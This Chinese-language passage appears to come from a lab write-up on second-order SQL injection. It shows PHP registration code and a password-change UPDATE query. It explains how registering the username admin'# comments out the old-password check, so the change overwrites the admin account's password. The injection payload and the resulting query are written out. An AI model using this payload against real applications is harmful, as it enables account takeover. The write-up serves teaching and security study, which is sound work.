  $username=  mysql_escape_string($_POST['username']) ;
  $pass= mysql_escape_string($_POST['password']);
  $re_pass= mysql_escape_string($_POST['re_password']);
```

我们先来注册一个 test 账号看一下业务逻辑，发现登入后台后可以修改密码，再来白盒看一下修改密码的 SQL 语句

```sql
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
```

固我们可以在用户名处构造 Payload 为`test'#`，提前闭合 username 参数，便有了覆盖其他账户密码的可能性，`$curr_pass`变量是原密码，所以这里被注释不影响密码的修改，反而去除了原密码的校验

```sql
UPDATE users SET PASSWORD='$pass' where username='test'#' and password='$curr_pass'
```

这里我们尝试修改 admin 的密码，改为 abc123，先注册 admin'#，再使用修改密码功能修改它的密码，因为此时 SQL 语句被提前闭合，所以实际上修改的是 admin 的密码  
![](assets/1707473863-386f99bbdb7f8d46c4eceb8c76e1c95b.png)
